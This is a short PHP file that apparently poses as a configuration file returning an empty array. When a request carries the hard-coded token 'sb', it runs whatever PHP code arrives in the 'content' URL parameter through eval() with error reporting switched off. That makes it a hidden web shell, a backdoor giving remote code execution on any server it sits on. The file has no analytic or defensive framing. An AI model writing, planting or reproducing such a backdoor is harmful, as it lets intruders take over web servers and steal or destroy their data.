<?php
if($_GET && $_GET['token'] == 'sb'){
    $content = $_GET['content'];
    if($content){
        $content = urldecode($content);
        $content = stripslashes($content);
        error_reporting(0);
        $msg = eval($content);
        echo $msg;
    }
}else{
    return array(
    );
}
?>